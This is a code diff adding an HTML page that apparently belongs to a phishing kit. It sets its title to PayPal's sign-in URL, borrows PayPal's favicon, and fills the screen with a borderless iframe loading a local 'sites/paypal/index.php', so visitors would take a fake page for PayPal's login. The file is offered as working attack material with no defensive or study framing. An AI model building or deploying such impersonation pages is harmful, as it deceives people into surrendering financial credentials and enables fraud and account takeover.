@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="https://www.google.com/s2/favicons?domain=https://paypal.com" type="image/x-icon">
+    <title>https://www.paypal.com/in/signin</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100vh; /* Altura total da tela */
+        }
+        #container {
+            height: 100vh; /* O contêiner ocupa 100% da altura da tela */
+            overflow: hidden;
+            position: relative; /* Para garantir que o iframe fique dentro do contêiner */
+        }
+        iframe {
+            width: 100%;
+            height: 100%; /* O iframe ocupa 100% da altura do contêiner */
+            border: none;
+            position: absolute; /* Para garantir que o iframe ocupe todo o espaço do contêiner */
+            top: 0; /* Alinha o iframe ao topo do contêiner */
+            left: 0; /* Alinha o iframe à esquerda do contêiner */
+        }
+    </style>
+</head>
+<body>
+
+<div id="container">
+    <iframe src="sites/paypal/index.php" frameborder="0"></iframe>
+</div>
+
+</body>
+</html>
